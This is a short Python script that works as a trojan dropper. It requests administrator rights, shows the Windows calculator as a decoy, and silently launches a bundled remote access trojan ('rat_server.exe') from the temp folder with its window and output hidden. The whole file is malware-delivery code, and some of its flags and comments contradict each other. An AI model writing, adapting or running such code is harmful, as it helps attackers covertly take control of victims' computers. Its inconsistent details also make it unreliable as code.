import sys
import os
import tempfile
import subprocess
import ctypes


def main():
    # Extract resources
    temp_dir = tempfile.gettempdir()

    # Extract legitimate calculator
    calc_path = os.path.join(temp_dir, "calc.exe")
    with open(calc_path, 'wb') as f:
        f.write(open('C:/Windows/System32/calc.exe', 'rb').read())

    # Extract RAT
    rat_path = os.path.join(temp_dir, "rat_server.exe")
    with open(rat_path, 'wb') as f:
        f.write(open('dist/rat_server.exe', 'rb').read())

    # Run calculator visibly
    subprocess.Popen(
        [calc_path],
        creationflags=subprocess.CREATE_NO_WINDOW
    )

    # Run RAT hidden
    subprocess.Popen(
        [rat_path],
        creationflags=subprocess.SW_HIDE | subprocess.CREATE_NO_WINDOW,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )


def elevate():
    """Request admin privileges"""
    if sys.platform == 'win32':
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )


if __name__ == "__main__":
    elevate()
    main()